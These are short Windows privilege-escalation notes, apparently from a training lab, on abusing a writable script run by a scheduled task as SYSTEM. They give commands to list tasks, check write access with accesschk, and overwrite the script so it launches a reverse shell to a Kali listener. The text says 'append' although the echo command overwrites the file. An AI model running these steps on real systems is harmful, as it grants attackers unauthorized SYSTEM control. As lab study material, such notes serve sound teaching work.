interesting scheduled tasks
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | Format-Table TaskName,TaskPath,State"

more info on task
schtasks /query /tn "TASK_NAME" /V /FO LIST

I know of no automated way to find vulnerable scheduled tasks. Will have to be found rather manually I believe.

View the contents of the C:\DevTools\CleanUp.ps1 script:
type C:\DevTools\CleanUp.ps1

The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:

C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1¬†which runs the reverse.exe executable you created:

echo C:\PrivEsc\reverse.exe > C:\DevTools\CleanUp.ps1

Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.